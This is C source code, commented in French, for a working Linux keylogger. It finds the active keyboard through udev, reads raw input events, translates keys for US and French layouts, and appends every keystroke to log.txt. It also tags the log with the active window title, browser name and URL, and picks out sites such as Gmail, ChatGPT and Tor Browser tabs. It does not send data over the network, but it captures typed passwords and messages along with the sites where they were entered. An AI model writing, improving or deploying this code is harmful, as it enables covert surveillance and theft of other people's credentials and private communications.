#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <locale.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>
#include <libudev.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <X11/Xlib.h>
#include <X11/Xatom.h>

// Structure pour stocker les différents caractères possibles pour une touche
typedef struct {
    const char *normal;     // Caractère normal
    const char *shifted;    // Avec Shift
    const char *altgr;      // Avec AltGr
    const char *shift_altgr; // Avec Shift+AltGr
} KeyMapping;

// Structure pour stocker les informations de la fenêtre active
typedef struct {
    Display *display;
    Window current_window;
    char current_window_title[256];
    char current_url[1024];  // Ajout pour stocker l'URL
} ActiveWindowInfo;

// Fonction pour détecter la disposition du clavier
int is_french_keyboard() {
    FILE *fp;
    char buffer[1024];
    int is_french = 0;

    // Vérifier la disposition du clavier via le fichier de configuration
    fp = popen("setxkbmap -query | grep layout", "r");
    if (fp == NULL) {
        printf("Impossible de détecter la disposition du clavier, utilisation de QWERTY par défaut\n");
        return 0;
    }

    if (fgets(buffer, sizeof(buffer), fp) != NULL) {
        // Le format attendu est "layout:     fr" ou "layout:     us"
        if (strstr(buffer, "fr") != NULL) {
            is_french = 1;
        }
    }

    pclose(fp);

    // Vérification alternative via localectl
    if (!is_french) {
        fp = popen("localectl status | grep 'X11 Layout'", "r");
        if (fp != NULL) {
            if (fgets(buffer, sizeof(buffer), fp) != NULL) {
                if (strstr(buffer, "fr") != NULL) {
                    is_french = 1;
                }
            }
            pclose(fp);
        }
    }

    printf("Configuration clavier détectée : %s\n", is_french ? "AZERTY (FR)" : "QWERTY (US)");
    return is_french;
}

const char *keycode_to_char(int keycode, int is_shifted, int is_altgr) {
    static int is_french = -1;
    if (is_french == -1) {
        is_french = is_french_keyboard();
        printf("Disposition clavier détectée : %s\n", is_french ? "AZERTY (FR)" : "QWERTY (US)");
    }

    // Mappage QWERTY (US)
    static const KeyMapping keymap_qwerty[KEY_MAX] = {
        [KEY_A] = {"a", "A", NULL, NULL},
        [KEY_B] = {"b", "B", NULL, NULL},
        [KEY_C] = {"c", "C", NULL, NULL},
        [KEY_D] = {"d", "D", NULL, NULL},
        [KEY_E] = {"e", "E", NULL, NULL},
        [KEY_F] = {"f", "F", NULL, NULL},
        [KEY_G] = {"g", "G", NULL, NULL},
        [KEY_H] = {"h", "H", NULL, NULL},
        [KEY_I] = {"i", "I", NULL, NULL},
        [KEY_J] = {"j", "J", NULL, NULL},
        [KEY_K] = {"k", "K", NULL, NULL},
        [KEY_L] = {"l", "L", NULL, NULL},
        [KEY_M] = {"m", "M", NULL, NULL},
        [KEY_N] = {"n", "N", NULL, NULL},
        [KEY_O] = {"o", "O", NULL, NULL},
        [KEY_P] = {"p", "P", NULL, NULL},
        [KEY_Q] = {"q", "Q", NULL, NULL},
        [KEY_R] = {"r", "R", NULL, NULL},
        [KEY_S] = {"s", "S", NULL, NULL},
        [KEY_T] = {"t", "T", NULL, NULL},
        [KEY_U] = {"u", "U", NULL, NULL},
        [KEY_V] = {"v", "V", NULL, NULL},
        [KEY_W] = {"w", "W", NULL, NULL},
        [KEY_X] = {"x", "X", NULL, NULL},
        [KEY_Y] = {"y", "Y", NULL, NULL},
        [KEY_Z] = {"z", "Z", NULL, NULL},
        [KEY_1] = {"1", "!", NULL, NULL},
        [KEY_2] = {"2", "@", NULL, NULL},
        [KEY_3] = {"3", "#", NULL, NULL},
        [KEY_4] = {"4", "$", NULL, NULL},
        [KEY_5] = {"5", "%", NULL, NULL},
        [KEY_6] = {"6", "^", NULL, NULL},
        [KEY_7] = {"7", "&", NULL, NULL},
        [KEY_8] = {"8", "*", NULL, NULL},
        [KEY_9] = {"9", "(", NULL, NULL},
        [KEY_0] = {"0", ")", NULL, NULL},
        [KEY_MINUS] = {"-", "_", NULL, NULL},
        [KEY_EQUAL] = {"=", "+", NULL, NULL},
        [KEY_LEFTBRACE] = {"[", "{", NULL, NULL},
        [KEY_RIGHTBRACE] = {"]", "}", NULL, NULL},
        [KEY_SEMICOLON] = {";", ":", NULL, NULL},
        [KEY_APOSTROPHE] = {"'", "\"", NULL, NULL},
        [KEY_GRAVE] = {"`", "~", NULL, NULL},
        [KEY_BACKSLASH] = {"\\", "|", NULL, NULL},
        [KEY_COMMA] = {",", "<", NULL, NULL},
        [KEY_DOT] = {".", ">", NULL, NULL},
        [KEY_SLASH] = {"/", "?", NULL, NULL},
        // Touches spéciales
        [KEY_ENTER] = {"\n", "\n", NULL, NULL},
        [KEY_SPACE] = {" ", " ", NULL, NULL},
        [KEY_TAB] = {"\t", "\t", NULL, NULL}
    };

    // Mappage AZERTY (FR)
    static const KeyMapping keymap_azerty[KEY_MAX] = {
        [KEY_Q] = {"a", "A", "æ", "Æ"},
        [KEY_B] = {"b", "B", NULL, NULL},
        [KEY_C] = {"c", "C", NULL, NULL},
        [KEY_D] = {"d", "D", NULL, NULL},
        [KEY_E] = {"e", "E", "€", NULL},
        [KEY_F] = {"f", "F", NULL, NULL},
        [KEY_G] = {"g", "G", NULL, NULL},
        [KEY_H] = {"h", "H", NULL, NULL},
        [KEY_I] = {"i", "I", NULL, NULL},
        [KEY_J] = {"j", "J", NULL, NULL},
        [KEY_K] = {"k", "K", NULL, NULL},
        [KEY_L] = {"l", "L", NULL, NULL},
        [KEY_SEMICOLON] = {"m", "M", NULL, NULL},
        [KEY_N] = {"n", "N", NULL, NULL},
        [KEY_O] = {"o", "O", "œ", "Œ"},
        [KEY_P] = {"p", "P", NULL, NULL},
        [KEY_A] = {"q", "Q", NULL, NULL},
        [KEY_R] = {"r", "R", NULL, NULL},
        [KEY_S] = {"s", "S", NULL, NULL},
        [KEY_T] = {"t", "T", NULL, NULL},
        [KEY_U] = {"u", "U", NULL, NULL},
        [KEY_V] = {"v", "V", NULL, NULL},
        [KEY_Z] = {"w", "W", NULL, NULL},
        [KEY_X] = {"x", "X", NULL, NULL},
        [KEY_Y] = {"y", "Y", NULL, NULL},
        [KEY_W] = {"z", "Z", NULL, NULL},
        [KEY_1] = {"&", "1", NULL, NULL},
        [KEY_2] = {"é", "2", "~", NULL},
        [KEY_3] = {"\"", "3", "#", NULL},
        [KEY_4] = {"'", "4", "{", NULL},
        [KEY_5] = {"(", "5", "[", NULL},
        [KEY_6] = {"-", "6", "|", NULL},
        [KEY_7] = {"è", "7", "`", NULL},
        [KEY_8] = {"_", "8", "\\", NULL},
        [KEY_9] = {"ç", "9", "^", NULL},
        [KEY_0] = {"à", "0", "@", NULL},
        [KEY_MINUS] = {")", "°", "]", NULL},
        [KEY_EQUAL] = {"=", "+", "}", NULL},
        [KEY_COMMA] = {",", "?", NULL, NULL},
        [KEY_DOT] = {";", ".", NULL, NULL},
        [KEY_SLASH] = {":", "/", NULL, NULL},
        [KEY_GRAVE] = {"²", NULL, NULL, NULL},
        // Touches spéciales
        [KEY_ENTER] = {"\n", "\n", NULL, NULL},
        [KEY_SPACE] = {" ", " ", NULL, NULL},
        [KEY_TAB] = {"\t", "\t", NULL, NULL}
    };

    const KeyMapping *mapping;
    if (keycode >= 0 && keycode < KEY_MAX) {
        mapping = is_french ? &keymap_azerty[keycode] : &keymap_qwerty[keycode];
        
        if (mapping->normal != NULL) {  // Vérifie si la touche est mappée
            if (is_shifted && is_altgr && mapping->shift_altgr)
                return mapping->shift_altgr;
            else if (is_altgr && mapping->altgr)
                return mapping->altgr;
            else if (is_shifted && mapping->shifted)
                return mapping->shifted;
            else
                return mapping->normal;
        }
    }

    // Touches spéciales qui ne changent pas
    switch (keycode) {
        case KEY_BACKSPACE: return "<BACKSPACE>";
        case KEY_ESC: return "<ESC>";
        case KEY_LEFTCTRL: return "<LEFTCTRL>";
        case KEY_RIGHTCTRL: return "<RIGHTCTRL>";
        case KEY_LEFTALT: return "<LEFTALT>";
        case KEY_RIGHTALT: return "<ALTGR>";
        case KEY_LEFTMETA: return "<LEFTMETA>";
        case KEY_RIGHTMETA: return "<RIGHTMETA>";
    }

    return "<UNKNOWN>";
}

void detect_active_keyboard_udev();
void log_keypress(const char *devnode);

int test_keyboard_activity(const char *devnode) {
    int fd = open(devnode, O_RDONLY | O_NONBLOCK);
    if (fd < 0) {
        printf("Impossible d'ouvrir %s\n", devnode);
        return 0;
    }

    printf("Test du périphérique %s pendant 5 secondes...\n", devnode);
    
    struct input_event ev;
    time_t start_time = time(NULL);
    int activity_detected = 0;

    while (time(NULL) - start_time < 5) {
        ssize_t n = read(fd, &ev, sizeof(struct input_event));
        if (n == sizeof(struct input_event)) {
            if (ev.type == EV_KEY && ev.value == 1) {
                printf("Activité clavier détectée sur %s!\n", devnode);
                activity_detected = 1;
                break;
            }
        }
        usleep(1000);
    }

    if (!activity_detected) {
        printf("Aucune activité détectée sur %s\n", devnode);
    }

    close(fd);
    return activity_detected;
}

void detect_active_keyboard_udev() {
    struct udev *udev = udev_new();
    if (!udev) {
        perror("Impossible de créer le contexte udev");
        return;
    }

    struct udev_enumerate *enumerate = udev_enumerate_new(udev);
    udev_enumerate_add_match_subsystem(enumerate, "input");
    udev_enumerate_scan_devices(enumerate);

    struct udev_list_entry *devices = udev_enumerate_get_list_entry(enumerate);
    struct udev_list_entry *dev_list_entry;

    udev_list_entry_foreach(dev_list_entry, devices) {
        const char *path = udev_list_entry_get_name(dev_list_entry);
        struct udev_device *dev = udev_device_new_from_syspath(udev, path);

        const char *sysname = udev_device_get_sysname(dev);
        const char *devnode = udev_device_get_devnode(dev);
        const char *keyboard_prop = udev_device_get_property_value(dev, "ID_INPUT_KEYBOARD");
        
        // Ne tester que les périphériques qui sont des claviers
        if (sysname && devnode && strstr(sysname, "event") && keyboard_prop && strcmp(keyboard_prop, "1") == 0) {
            printf("\nTest du périphérique clavier : %s (%s)\n", sysname, devnode);
            
            if (test_keyboard_activity(devnode)) {
                printf("Clavier actif trouvé : %s\n", devnode);
                printf("Début de l'enregistrement des touches...\n");
                log_keypress(devnode);
                // Une fois qu'on a trouvé le bon clavier, on arrête la recherche
                udev_device_unref(dev);
                break;
            }
        }
        
        udev_device_unref(dev);
    }

    udev_enumerate_unref(enumerate);
    udev_unref(udev);
}

// Fonction pour obtenir le titre de la fenêtre
char* get_window_title(Display *display, Window window) {
    Atom actual_type;
    int actual_format;
    unsigned long nitems;
    unsigned long bytes_after;
    unsigned char *data = NULL;
    static char title[256];
    
    // Essayer d'abord _NET_WM_NAME (UTF-8)
    Atom utf8_atom = XInternAtom(display, "UTF8_STRING", False);
    Atom name_atom = XInternAtom(display, "_NET_WM_NAME", False);
    
    int status = XGetWindowProperty(display, window, name_atom, 0, 1024, False,
                                  utf8_atom, &actual_type, &actual_format,
                                  &nitems, &bytes_after, &data);
                                  
    if (status != Success || data == NULL) {
        // Essayer WM_NAME comme fallback
        status = XGetWindowProperty(display, window, XA_WM_NAME, 0, 1024, False,
                                  XA_STRING, &actual_type, &actual_format,
                                  &nitems, &bytes_after, &data);
    }
    
    if (status == Success && data != NULL) {
        strncpy(title, (char*)data, 255);
        title[255] = '\0';
        XFree(data);
    } else {
        strcpy(title, "Unknown");
    }
    
    return title;
}

// Fonction pour obtenir la fenêtre active
Window get_active_window(Display *display) {
    Atom active_window_atom = XInternAtom(display, "_NET_ACTIVE_WINDOW", False);
    Atom actual_type;
    int actual_format;
    unsigned long nitems;
    unsigned long bytes_after;
    unsigned char *data = NULL;
    Window active_window = None;

    if (XGetWindowProperty(display, DefaultRootWindow(display), active_window_atom,
                          0, 1, False, XA_WINDOW, &actual_type, &actual_format,
                          &nitems, &bytes_after, &data) == Success) {
        if (data != NULL) {
            active_window = *(Window*)data;
            XFree(data);
        }
    }

    return active_window;
}

// Modification de la fonction get_browser_name
char* get_browser_name(const char* window_title) {
    static char browser_name[32];
    
    if (strstr(window_title, "Mozilla") || strstr(window_title, "Firefox")) {
        strcpy(browser_name, "Firefox");
    } else if (strstr(window_title, "Google Chrome")) {
        strcpy(browser_name, "Chrome");
    } else if (strstr(window_title, "Opera")) {
        strcpy(browser_name, "Opera");
    } else if (strstr(window_title, "Edge")) {
        strcpy(browser_name, "Edge");
    } else if (strstr(window_title, "Safari")) {
        strcpy(browser_name, "Safari");
    } else if (strstr(window_title, "Tor Browser")) {
        strcpy(browser_name, "Tor");
    } else {
        strcpy(browser_name, "Browser");
    }
    return browser_name;
}

// Modification de la fonction extract_tab_title
char* extract_tab_title(const char* full_title) {
    static char tab_title[256];
    char *dash_pos;
    
    // Copier le titre complet
    strncpy(tab_title, full_title, sizeof(tab_title) - 1);
    tab_title[sizeof(tab_title) - 1] = '\0';
    
    // Supprimer les suffixes des navigateurs
    if ((dash_pos = strstr(tab_title, " - Google Chrome"))) *dash_pos = '\0';
    else if ((dash_pos = strstr(tab_title, " - Mozilla Firefox"))) *dash_pos = '\0';
    else if ((dash_pos = strstr(tab_title, " - Opera"))) *dash_pos = '\0';
    else if ((dash_pos = strstr(tab_title, " - Microsoft Edge"))) *dash_pos = '\0';
    else if ((dash_pos = strstr(tab_title, " - Safari"))) *dash_pos = '\0';
    else if ((dash_pos = strstr(tab_title, " - Tor Browser"))) *dash_pos = '\0';
    else if ((dash_pos = strstr(tab_title, " — Safari"))) *dash_pos = '\0';  // Safari utilise parfois un tiret différent
    else if ((dash_pos = strstr(tab_title, " · Tor Browser"))) *dash_pos = '\0';  // Tor utilise parfois un point médian
    
    // Pour les sites spécifiques, extraire le nom principal
    if (strstr(tab_title, "ChatGPT")) return "ChatGPT";
    if (strstr(tab_title, "Notion")) return "Notion";
    if (strstr(tab_title, "Gmail")) return "Gmail";
    if (strstr(tab_title, "Twilio")) return "Twilio";
    if (strstr(tab_title, "DuckDuckGo")) return "DuckDuckGo";
    if (strstr(tab_title, "Tor")) return "Tor Home";
    
    return tab_title;
}

// Modification de la fonction get_browser_url pour inclure les propriétés de Safari et Tor
char* get_browser_url(Display *display, Window window) {
    static char url[1024];
    Atom actual_type;
    int actual_format;
    unsigned long nitems;
    unsigned long bytes_after;
    unsigned char *data = NULL;
    
    const char* properties[] = {
        "_MOZILLA_URL",           // Firefox et Tor Browser
        "_NET_WM_NAME",          // Titre de la fenêtre général
        "WM_NAME",               // Nom de la fenêtre
        "_CHROME_URL",           // Chrome
        "_OPERA_URL",            // Opera
        "_SAFARI_URL",           // Safari (si disponible)
        "WM_WINDOW_ROLE",        // Rôle de la fenêtre
        "_TOR_BROWSER_URL"       // Tor Browser spécifique (si disponible)
    };
    
    url[0] = '\0';
    
    // Obtenir d'abord le titre de la fenêtre
    char *window_title = get_window_title(display, window);
    
    // Vérifier si le titre contient une URL
    if (strstr(window_title, "http://") || strstr(window_title, "https://")) {
        strncpy(url, window_title, 1023);
        url[1023] = '\0';
        return url;
    }
    
    // Vérifier les propriétés spécifiques
    for (int i = 0; i < sizeof(properties)/sizeof(properties[0]); i++) {
        Atom property = XInternAtom(display, properties[i], False);
        if (XGetWindowProperty(display, window, property, 0, 1024, False,
                             AnyPropertyType, &actual_type, &actual_format,
                             &nitems, &bytes_after, &data) == Success) {
            if (data != NULL) {
                if (strstr((char*)data, "http://") || strstr((char*)data, "https://")) {
                    strncpy(url, (char*)data, 1023);
                    url[1023] = '\0';
                    XFree(data);
                    return url;
                }
                XFree(data);
            }
        }
    }
    
    // Si aucune URL n'est trouvée, utiliser le titre de la fenêtre
    if (window_title && window_title[0] != '\0') {
        snprintf(url, 1023, "page: %s", window_title);
    } else {
        strcpy(url, "page inconnue");
    }
    
    return url;
}

// Modification de la fonction update_active_window
void update_active_window(ActiveWindowInfo *info) {
    Window new_window = get_active_window(info->display);
    if (new_window != None) {
        char *title = get_window_title(info->display, new_window);
        char *url = get_browser_url(info->display, new_window);
        
        // Vérifier si la fenêtre ou l'URL a changé
        if (new_window != info->current_window || 
            strcmp(title, info->current_window_title) != 0 ||
            (url[0] != '\0' && strcmp(url, info->current_url) != 0)) {
            
            info->current_window = new_window;
            strncpy(info->current_window_title, title, sizeof(info->current_window_title) - 1);
            info->current_window_title[sizeof(info->current_window_title) - 1] = '\0';
            
            if (url[0] != '\0') {
                strncpy(info->current_url, url, sizeof(info->current_url) - 1);
                info->current_url[sizeof(info->current_url) - 1] = '\0';
            } else {
                info->current_url[0] = '\0';
            }
        }
    }
}

// Modification de la fonction log_keypress
void log_keypress(const char *devnode) {
    // Initialisation de X11
    ActiveWindowInfo window_info = {0};
    window_info.display = XOpenDisplay(NULL);
    if (!window_info.display) {
        fprintf(stderr, "Impossible de se connecter au serveur X\n");
        return;
    }

    printf("Écoute des touches sur le clavier actif : %s\n", devnode);

    FILE *log_file = fopen("log.txt", "a");
    if (!log_file) {
        perror("Erreur lors de l'ouverture du fichier log.txt");
        XCloseDisplay(window_info.display);
        return;
    }

    int fd = open(devnode, O_RDONLY);
    if (fd < 0) {
        perror("Erreur lors de l'ouverture du périphérique");
        fclose(log_file);
        XCloseDisplay(window_info.display);
        return;
    }

    struct input_event ev;
    int is_shifted = 0;
    int is_altgr = 0;
    int is_left_alt = 0;
    time_t last_window_check = 0;
    static char last_url[1024] = "";  // Pour suivre le dernier URL visité
    static char last_window_title[256] = "";  // Pour suivre le dernier titre de fenêtre

    printf("Appuyez sur les touches pour les enregistrer dans log.txt (Ctrl+C pour arrêter)...\n");
    
    while (1) {
        time_t current_time = time(NULL);
        if (current_time - last_window_check >= 0) {
            update_active_window(&window_info);
            
            // Vérifier si l'URL ou le titre a changé
            if (window_info.current_window_title[0] != '\0' && 
                (strcmp(window_info.current_window_title, last_window_title) != 0 ||
                 strcmp(window_info.current_url, last_url) != 0)) {
                
                char *browser = get_browser_name(window_info.current_window_title);
                char *tab_title = extract_tab_title(window_info.current_window_title);
                
                fprintf(log_file, "\n[%s - %s - %s]\n", 
                    browser,
                    tab_title,
                    window_info.current_url[0] != '\0' ? window_info.current_url : "no URL");
                printf("\n[%s - %s - %s]\n", 
                    browser,
                    tab_title,
                    window_info.current_url[0] != '\0' ? window_info.current_url : "no URL");
                
                strncpy(last_window_title, window_info.current_window_title, sizeof(last_window_title) - 1);
                strncpy(last_url, window_info.current_url, sizeof(last_url) - 1);
            }
            
            last_window_check = current_time;
        }

        ssize_t n = read(fd, &ev, sizeof(struct input_event));
        if (n == sizeof(struct input_event)) {
            if (ev.type == EV_KEY) {
                if (ev.value == 1 || ev.value == 0) {
                    if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                        is_shifted = (ev.value == 1);
                    } 
                    else if (ev.code == KEY_RIGHTALT) {
                        is_altgr = (ev.value == 1);
                    }
                    else if (ev.code == KEY_LEFTALT) {
                        is_left_alt = (ev.value == 1);
                    }
                    else if (ev.value == 1 && !is_left_alt) {
                        const char *key_char = keycode_to_char(ev.code, is_shifted, is_altgr);
                        fprintf(log_file, "%s", key_char);
                        fflush(log_file);
                        printf("%s", key_char);
                        fflush(stdout);
                    }
                }
            }
        }
    }

    XCloseDisplay(window_info.display);
    close(fd);
    fclose(log_file);
}

int main() {
    printf("Démarrage de la détection de clavier actif...\n");
    detect_active_keyboard_udev();
    return 0;
}
